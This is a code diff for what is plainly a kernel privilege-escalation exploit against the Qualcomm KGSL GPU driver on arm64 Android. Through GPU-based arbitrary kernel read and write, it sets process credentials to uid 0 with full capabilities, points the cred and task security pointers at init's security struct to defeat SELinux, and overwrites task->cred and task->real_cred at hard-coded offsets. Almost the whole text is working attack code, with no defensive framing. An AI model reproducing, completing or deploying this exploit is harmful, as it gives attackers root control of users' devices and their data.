@@ -59,6 +59,9 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define KGSL_MEMFLAGS_USE_CPU_MAP (1ULL << 28)
 #define KGSL_CACHEMODE_SHIFT 0
 #define KGSL_CACHEMODE_MASK 3
+#define KGSL_CACHEMODE_UNCACHED 0
+#define KGSL_CACHEMODE_WRITECOMBINE 1
+#define KGSL_CACHEMODE_WRITETHROUGH 2
 #define KGSL_CACHEMODE_WRITEBACK 3
 #define KGSL_USER_MEM_TYPE_ADDR 2
 #define KGSL_CONTEXT_PREAMBLE 0x00000010
@@ -306,16 +309,15 @@ static int write_mem(uint64_t addr, uint32_t *data, int dwords, int ctx_id,
     return 0;
 }
 
-static int find_security_offset(uint64_t task_addr, uint64_t cred_sec_ptr,
+static int find_security_offset(uint64_t task_addr, uint64_t old_sec_ptr,
                                 int ctx_id, uint64_t ib_ga, unsigned int ib_id,
                                 uint64_t dst_ga, void *ib_m, void *dst_m) {
     uint32_t buf[SCAN_DWORDS];
     if (read_mem(task_addr, buf, SCAN_DWORDS, ctx_id, ib_ga, ib_id, dst_ga, ib_m, dst_m) < 0)
         return -1;
-    uint64_t target = cred_sec_ptr;
     for (int i = 0; i < SCAN_DWORDS - 1; i++) {
         uint64_t val = (uint64_t)buf[i] | ((uint64_t)buf[i+1] << 32);
-        if (val == target) {
+        if (val == old_sec_ptr) {
             return i * 4;
         }
     }
@@ -486,7 +488,6 @@ int main(int argc, char **argv) {
         goto cleanup;
     }
 
-    // Read init_cred->security (this points to init's task_security_struct)
     uint64_t inc_sec = 0;
     {
         uint32_t buf[2];
@@ -499,92 +500,60 @@ int main(int argc, char **argv) {
         }
     }
 
-    // Read init's SID (first dword of the security struct)
-    uint32_t init_sid = 0;
-    {
-        uint32_t buf[1];
-        if (read_mem(inc_sec, buf, 1, ctx_id, ib_ga, ib_id, dst_ga, ib_m, dst_m) == 0) {
-            init_sid = buf[0];
-            printf("  init SID = 0x%08x\n", init_sid);
-        } else {
-            printf("[-] Failed to read init SID\n");
-            goto cleanup;
-        }
-    }
-
-    // For each found task, overwrite its cred and also set task->security to point to init's security.
     for (int p = 0; p < n_cred; p++) {
+        uint64_t cbase = cred_pages[p] + cred_offs[p];
         uint64_t task_addr = cred_pages[p];
-        uint64_t cbase = task_addr + cred_offs[p];
 
-        // 1) Read current cred->security pointer (before we overwrite it)
+        // Read current cred->security before overwriting
         uint32_t old_sec[2];
-        if (read_mem(cbase + 0x78, old_sec, 2, ctx_id, ib_ga, ib_id, dst_ga, ib_m, dst_m) < 0) {
-            printf("[-] Failed to read cred->security for task %d\n", p);
-            continue;
-        }
-        uint64_t old_sec_ptr = (uint64_t)old_sec[0] | ((uint64_t)old_sec[1] << 32);
+        if (read_mem(cbase + 0x78, old_sec, 2, ctx_id, ib_ga, ib_id, dst_ga, ib_m, dst_m) == 0) {
+            uint64_t old_sec_ptr = (uint64_t)old_sec[0] | ((uint64_t)old_sec[1] << 32);
 
-        // 2) Write uid=0 and capabilities
-        uint32_t data[21];
-        memset(data, 0, sizeof(data));
-        data[1] = 0x00000004; // uid=0
-        data[4] = 0xFFFFFFFF; data[5] = 0x0000003F;
-        data[6] = 0xFFFFFFFF; data[7] = 0x0000003F;
-        data[8] = 0xFFFFFFFF; data[9] = 0x0000003F;
-        if (write_mem(cbase + 0x04, data, 21, ctx_id, ib_ga, ib_id, ib_m) < 0) {
-            printf("[-] Failed to write uid/caps for task %d\n", p);
-            continue;
-        }
+            // Write uid=0 + caps
+            uint32_t data[21];
+            memset(data, 0, sizeof(data));
+            data[1] = 0x00000004;
+            data[4] = 0xFFFFFFFF; data[5] = 0x0000003F;
+            data[6] = 0xFFFFFFFF; data[7] = 0x0000003F;
+            data[8] = 0xFFFFFFFF; data[9] = 0x0000003F;
+            if (write_mem(cbase + 0x04, data, 21, ctx_id, ib_ga, ib_id, ib_m) == 0) {
+                // Write cred->security = inc_sec
+                uint32_t sec_ptr[2];
+                split64(inc_sec, &sec_ptr[0], &sec_ptr[1]);
+                if (write_mem(cbase + 0x78, sec_ptr, 2, ctx_id, ib_ga, ib_id, ib_m) == 0) {
+                    // Write task->real_cred and task->cred to cbase
+                    uint32_t ptr_lo, ptr_hi;
+                    split64(cbase, &ptr_lo, &ptr_hi);
+                    write_mem(task_addr + 0x738, &ptr_lo, 2, ctx_id, ib_ga, ib_id, ib_m);
+                    write_mem(task_addr + 0x740, &ptr_lo, 2, ctx_id, ib_ga, ib_id, ib_m);
 
-        // 3) Write cred->security to point to init's security struct
-        uint32_t sec_ptr[2];
-        split64(inc_sec, &sec_ptr[0], &sec_ptr[1]);
-        if (write_mem(cbase + 0x78, sec_ptr, 2, ctx_id, ib_ga, ib_id, ib_m) < 0) {
-            printf("[-] Failed to write cred->security for task %d\n", p);
-            continue;
-        }
+                    // Find and write task->security to inc_sec
+                    int sec_off = find_security_offset(task_addr, old_sec_ptr, ctx_id,
+                                                       ib_ga, ib_id, dst_ga, ib_m, dst_m);
+                    if (sec_off >= 0 && sec_off < 0x1000) {
+                        write_mem(task_addr + sec_off, sec_ptr, 2, ctx_id, ib_ga, ib_id, ib_m);
+                        printf("[+] task->security offset found: 0x%x, written to init's security\n", sec_off);
+                    } else {
+                        // Try common offsets as fallback
+                        int common_offs[] = {0x7D8, 0x7E0, 0x7E8};
+                        for (int i = 0; i < 3; i++) {
+                            if (write_mem(task_addr + common_offs[i], sec_ptr, 2, ctx_id, ib_ga, ib_id, ib_m) == 0) {
+                                printf("[+] Wrote task->security at common offset 0x%x\n", common_offs[i]);
+                                break;
+                            }
+                        }
+                    }
 
-        // 4) Write task->real_cred and task->cred to point to our modified cred
-        uint32_t ptr_lo, ptr_hi;
-        split64(cbase, &ptr_lo, &ptr_hi);
-        if (write_mem(task_addr + 0x738, &ptr_lo, 2, ctx_id, ib_ga, ib_id, ib_m) < 0) continue;
-        if (write_mem(task_addr + 0x740, &ptr_lo, 2, ctx_id, ib_ga, ib_id, ib_m) < 0) continue;
-
-        // 5) Find and set task->security to point to init's security struct
-        // Scan the task page for a pointer that matches old_sec_ptr (the original task->security)
-        int sec_off = find_security_offset(task_addr, old_sec_ptr, ctx_id,
-                                           ib_ga, ib_id, dst_ga, ib_m, dst_m);
-        if (sec_off >= 0 && sec_off < 0x1000) {
-            if (write_mem(task_addr + sec_off, sec_ptr, 2, ctx_id, ib_ga, ib_id, ib_m) < 0) {
-                printf("[-] Failed to write task->security at offset 0x%x\n", sec_off);
-            } else {
-                printf("[+] task->security offset found: 0x%x, written to init's security\n", sec_off);
-            }
-        } else {
-            // Try common offsets for arm64 if scanning fails
-            int common_offs[] = {0x7D8, 0x7E0, 0x7E8};
-            int written = 0;
-            for (int i = 0; i < 3; i++) {
-                if (write_mem(task_addr + common_offs[i], sec_ptr, 2, ctx_id, ib_ga, ib_id, ib_m) == 0) {
-                    printf("[+] Wrote task->security at common offset 0x%x\n", common_offs[i]);
-                    written = 1;
-                    break;
+                    // Verify uid
+                    uint32_t uid_buf[1];
+                    if (read_mem(cbase + 0x04, uid_buf, 1, ctx_id, ib_ga, ib_id, dst_ga, ib_m, dst_m) == 0) {
+                        printf("  CRED[%d]: uid=0x%08X %s\n", p, uid_buf[0], uid_buf[0] == 0 ? "OK" : "FAIL");
+                    }
                 }
             }
-            if (!written) {
-                printf("[-] Could not set task->security\n");
-            }
-        }
-
-        // 6) Verify uid
-        uint32_t uid_buf[1];
-        if (read_mem(cbase + 0x04, uid_buf, 1, ctx_id, ib_ga, ib_id, dst_ga, ib_m, dst_m) == 0) {
-            printf("  CRED[%d]: uid=0x%08X %s\n", p, uid_buf[0], uid_buf[0] == 0 ? "OK" : "FAIL");
         }
     }
 
-    // Cache eviction
     void *ev = mmap(0, 0x2000000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
     if (ev != MAP_FAILED) {
         volatile char *p = (volatile char *)ev;
